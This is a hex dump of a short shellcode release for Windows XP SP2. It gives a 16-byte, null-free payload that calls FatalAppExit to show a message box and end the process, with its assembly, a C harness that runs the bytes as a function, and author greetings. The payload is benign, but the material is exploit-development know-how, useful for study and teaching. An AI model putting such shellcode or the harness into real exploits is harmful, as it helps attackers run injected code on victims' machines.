00000000  2b 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |+---------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000030  2d 2d 2d 2d 2d 2d 2b 0d  0a 7c 20 57 69 6e 64 6f  |------+..| Windo|
00000040  77 73 20 58 50 20 50 72  6f 20 53 70 32 20 45 6e  |ws XP Pro Sp2 En|
00000050  67 6c 69 73 68 20 22 4d  65 73 73 61 67 65 2d 42  |glish "Message-B|
00000060  6f 78 22 20 53 68 65 6c  6c 63 6f 64 65 2e 20 7c  |ox" Shellcode. ||
00000070  0d 0a 2b 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |..+-------------|
00000080  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000000a0  2d 2d 2d 2d 2d 2d 2d 2d  2b 0d 0a 0d 0a 53 69 7a  |--------+....Siz|
000000b0  65 20 20 20 20 20 20 20  20 20 3a 20 31 36 20 42  |e         : 16 B|
000000c0  79 74 65 73 2c 20 4e 75  6c 6c 2d 46 72 65 65 2e  |ytes, Null-Free.|
000000d0  0d 0a 41 75 74 68 6f 72  20 20 20 20 20 20 20 3a  |..Author       :|
000000e0  20 41 6f 64 72 75 6c 65  7a 2e 20 0d 0a 45 6d 61  | Aodrulez. ..Ema|
000000f0  69 6c 20 20 20 20 20 20  20 20 3a 20 66 33 61 72  |il        : f3ar|
00000100  6d 33 64 33 61 72 40 67  6d 61 69 6c 2e 63 6f 6d  |m3d3ar@gmail.com|
00000110  0d 0a 0d 0a 0d 0a 53 68  65 6c 6c 63 6f 64 65 20  |......Shellcode |
00000120  3d 20 22 5c 78 42 39 5c  78 33 38 5c 78 44 44 5c  |= "\xB9\x38\xDD\|
00000130  78 38 32 5c 78 37 43 5c  78 33 33 5c 78 43 30 5c  |x82\x7C\x33\xC0\|
00000140  78 42 42 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |xBB"..          |
00000150  20 20 22 5c 78 44 38 5c  78 30 41 5c 78 38 36 5c  |  "\xD8\x0A\x86\|
00000160  78 37 43 5c 78 35 31 5c  78 35 30 5c 78 46 46 5c  |x7C\x51\x50\xFF\|
00000170  78 64 33 22 3b 0d 0a 0d  0a 0d 0a 2b 2d 2d 2d 2d  |xd3";......+----|
00000180  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2b 0d 0a 7c 20 44  |----------+..| D|
00000190  65 73 63 72 69 70 74 69  6f 6e 3a 20 7c 0d 0a 2b  |escription: |..+|
000001a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2b 0a  |--------------+.|
000001b0  0d 0a 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |..~~~~~~~~~~~~~~|
000001c0  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
000001e0  7e 7e 7e 7e 7e 7e 7e 7e  0d 0a 0d 0a 49 27 76 65  |~~~~~~~~....I've|
000001f0  20 75 73 65 64 20 61 20  46 75 6e 63 74 69 6f 6e  | used a Function|
00000200  20 63 61 6c 6c 65 64 20  22 46 61 74 61 6c 41 70  | called "FatalAp|
00000210  70 45 78 69 74 22 2e 0d  0a 54 68 65 20 42 65 6e  |pExit"...The Ben|
00000220  65 66 69 74 73 20 61 72  65 20 54 68 72 65 65 2d  |efits are Three-|
00000230  46 6f 6c 64 21 0d 0a 0d  0a 31 5d 20 44 69 73 70  |Fold!....1] Disp|
00000240  6c 61 79 73 20 61 20 4d  65 73 73 61 67 65 42 6f  |lays a MessageBo|
00000250  78 2e 0d 0a 32 5d 20 54  65 72 6d 69 6e 61 74 65  |x...2] Terminate|
00000260  73 20 74 68 65 20 50 72  6f 63 65 73 73 2e 20 0d  |s the Process. .|
00000270  0a 33 5d 20 49 74 73 20  74 68 65 72 65 20 69 6e  |.3] Its there in|
00000280  20 4b 65 72 6e 65 6c 33  32 2e 64 6c 6c 20 69 74  | Kernel32.dll it|
00000290  73 65 6c 66 2e 0a 0d 0a  7e 7e 7e 7e 7e 7e 7e 7e  |self....~~~~~~~~|
000002a0  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
000002c0  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 0d 0a  |~~~~~~~~~~~~~~..|
000002d0  0d 0a 2b 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2b 0d  |..+-----------+.|
000002e0  0a 7c 20 41 73 6d 20 43  6f 64 65 3a 20 7c 0d 0a  |.| Asm Code: |..|
000002f0  2b 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2b 0d 0a 0d  |+-----------+...|
00000300  0a 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |.~~~~~~~~~~~~~~~|
00000310  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
00000330  7e 7e 7e 7e 7e 7e 7e 0d  0a 0d 0a 73 68 65 6c 6c  |~~~~~~~....shell|
00000340  63 6f 64 65 3a 0d 0a 20  09 20 20 20 20 20 20 6d  |code:.. .      m|
00000350  6f 76 20 65 63 78 2c 37  63 38 32 64 64 33 38 68  |ov ecx,7c82dd38h|
00000360  20 3b 22 41 64 6d 69 6e  22 20 73 74 72 69 6e 67  | ;"Admin" string|
00000370  20 69 6e 20 6d 65 6d 0d  0a 20 09 20 20 20 20 20  | in mem.. .     |
00000380  20 78 6f 72 20 65 61 78  2c 65 61 78 0d 0a 20 09  | xor eax,eax.. .|
00000390  20 20 20 20 20 20 6d 6f  76 20 65 62 78 2c 37 63  |      mov ebx,7c|
000003a0  38 36 30 61 64 38 68 20  3b 41 64 64 72 20 6f 66  |860ad8h ;Addr of|
000003b0  20 22 46 61 74 61 6c 41  70 70 45 78 69 74 28 29  | "FatalAppExit()|
000003c0  22 20 0d 0a 20 09 09 70  75 73 68 20 65 63 78 20  |" .. ..push ecx |
000003d0  20 20 20 20 20 20 20 20  20 3b 66 75 6e 63 74 69  |         ;functi|
000003e0  6f 6e 20 66 72 6f 6d 20  4b 65 72 6e 65 6c 33 32  |on from Kernel32|
000003f0  0d 0a 20 09 09 70 75 73  68 20 65 61 78 20 20 20  |.. ..push eax   |
00000400  20 20 20 20 20 20 20 0d  0a 20 09 09 63 61 6c 6c  |       .. ..call|
00000410  20 65 62 78 20 20 20 20  20 20 20 20 20 20 3b 41  | ebx          ;A|
00000420  70 70 20 64 6f 65 73 20  61 20 43 6c 65 61 6e 20  |pp does a Clean |
00000430  45 78 69 74 2e 0d 0a 0d  0a 7e 7e 7e 7e 7e 7e 7e  |Exit.....~~~~~~~|
00000440  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
00000460  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 0d  |~~~~~~~~~~~~~~~.|
00000470  0a 0d 0a 0d 0a 2b 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.....+----------|
00000480  2d 2d 2d 2d 2d 2d 2d 2b  0d 0a 7c 20 53 68 65 6c  |-------+..| Shel|
00000490  6c 63 6f 64 65 74 65 73  74 2e 63 20 7c 0d 0a 2b  |lcodetest.c |..+|
000004a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000004b0  2d 2b 0d 0a 0d 0a 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |-+....~~~~~~~~~~|
000004c0  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
000004e0  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 0d 0a 0d 0a  |~~~~~~~~~~~~....|
000004f0  63 68 61 72 20 63 6f 64  65 5b 5d 20 3d 20 22 5c  |char code[] = "\|
00000500  78 42 39 5c 78 33 38 5c  78 44 44 5c 78 38 32 5c  |xB9\x38\xDD\x82\|
00000510  78 37 43 5c 78 33 33 5c  78 43 30 5c 78 42 42 22  |x7C\x33\xC0\xBB"|
00000520  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000530  22 5c 78 44 38 5c 78 30  41 5c 78 38 36 5c 78 37  |"\xD8\x0A\x86\x7|
00000540  43 5c 78 35 31 5c 78 35  30 5c 78 46 46 5c 78 64  |C\x51\x50\xFF\xd|
00000550  33 22 3b 0d 0a 0d 0a 0d  0a 69 6e 74 20 6d 61 69  |3";......int mai|
00000560  6e 28 69 6e 74 20 61 72  67 63 2c 20 63 68 61 72  |n(int argc, char|
00000570  20 2a 2a 61 72 67 76 29  0d 0a 7b 0d 0a 20 20 69  | **argv)..{..  i|
00000580  6e 74 20 28 2a 66 75 6e  63 29 28 29 3b 0d 0a 20  |nt (*func)();.. |
00000590  20 66 75 6e 63 20 3d 20  28 69 6e 74 20 28 2a 29  | func = (int (*)|
000005a0  28 29 29 20 63 6f 64 65  3b 0d 0a 20 20 28 69 6e  |()) code;..  (in|
000005b0  74 29 28 2a 66 75 6e 63  29 28 29 3b 0d 0a 7d 0d  |t)(*func)();..}.|
000005c0  0a 0d 0a 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |...~~~~~~~~~~~~~|
000005d0  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
000005f0  7e 7e 7e 7e 7e 7e 7e 7e  7e 0d 0a 0a 0d 0a 2b 2d  |~~~~~~~~~.....+-|
00000600  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000610  2d 2d 2b 0d 0a 7c 20 47  72 65 65 74 7a 20 46 6c  |--+..| Greetz Fl|
00000620  79 20 4f 75 74 20 54 6f  20 7c 0d 0a 2b 2d 2d 2d  |y Out To |..+---|
00000630  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000640  2b 0d 0a 0d 0a 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |+....~~~~~~~~~~~|
00000650  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
00000670  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 0d 0a 0d 0a 31  |~~~~~~~~~~~....1|
00000680  5d 20 41 6d 66 6f 72 6b  65 64 28 29 09 20 3a 20  |] Amforked(). : |
00000690  4d 79 20 4d 65 6e 74 6f  72 2e 0d 0a 32 5d 20 54  |My Mentor...2] T|
000006a0  68 65 20 42 6c 75 65 20  47 65 6e 69 75 73 20 3a  |he Blue Genius :|
000006b0  20 4d 79 20 42 6f 73 73  2e 0d 0a 33 5d 20 77 77  | My Boss...3] ww|
000006c0  77 2e 6f 72 63 68 69 64  73 65 76 65 6e 2e 63 6f  |w.orchidseven.co|
000006d0  6d 0d 0a 34 5d 20 73 74  72 30 6b 65 0d 0a 0d 0a  |m..4] str0ke....|
000006e0  7e 7e 7e 7e 7e 7e 7e 7e  7e 7e 7e 7e 7e 7e 7e 7e  |~~~~~~~~~~~~~~~~|
*
00000710  7e 7e 7e 7e 7e 7e 0d 0a  0d 0a 2b 2d 2d 2d 2d 2d  |~~~~~~....+-----|
00000720  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000740  2d 2d 2d 2d 2d 2d 2d 2d  2b 0d 0a 7c 20 46 6f 72  |--------+..| For|
00000750  67 69 76 65 2c 20 4f 20  4c 6f 72 64 2c 20 4d 79  |give, O Lord, My|
00000760  20 4c 69 74 74 6c 65 20  4a 6f 6b 65 73 20 6f 6e  | Little Jokes on|
00000770  20 54 68 65 65 2c 20 20  20 7c 0d 0a 7c 20 61 6e  | Thee,   |..| an|
00000780  64 20 49 27 6c 6c 20 46  6f 72 67 69 76 65 20 54  |d I'll Forgive T|
00000790  68 79 20 47 72 65 61 74  20 42 69 67 20 4a 6f 6b  |hy Great Big Jok|
000007a0  65 20 6f 6e 20 4d 65 2e  20 20 7c 0d 0a 2b 2d 2d  |e on Me.  |..+--|
000007b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000007d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2b              |-----------+|
000007dc
